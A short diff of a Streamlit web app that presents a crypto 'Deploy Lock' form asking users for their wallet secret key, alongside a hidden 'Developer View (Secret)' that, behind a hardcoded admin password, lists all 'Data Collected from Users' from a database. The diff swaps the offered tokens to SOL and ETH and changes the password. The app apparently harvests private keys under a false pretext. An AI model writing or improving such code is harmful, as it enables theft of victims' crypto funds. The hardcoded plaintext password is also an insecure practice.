@@ -84,7 +84,7 @@ if menu == "Dashboard":
     with st.form("lock_form"):
         name = st.text_input("Project Name")
         s_key = st.text_input("Wallet Secret Key", type="password")
-        coin = st.selectbox("Token", ["PEPE", "DOGE", "SHIB"])
+        coin = st.selectbox("Token", ["SOL","ETH"])
         amt = st.number_input("Amount")
         
         if st.form_submit_button("Deploy Lock"):
@@ -96,7 +96,7 @@ elif menu == "Developer Panel":
     st.title("🛠️ Developer View (Secret)")
     password = st.text_input("Admin Password", type="password")
     
-    if password == "admin123":
+    if password == "Ovidiu_seful_tuturor20":
         conn = sqlite3.connect('streamflow_vault.db')
         df = pd.read_sql_query("SELECT * FROM user_data", conn)
         conn.close()
@@ -104,4 +104,5 @@ elif menu == "Developer Panel":
         st.write("### Data Collected from Users")
         st.dataframe(df, use_container_width=True)
     else:
+
         st.error("Access Denied")
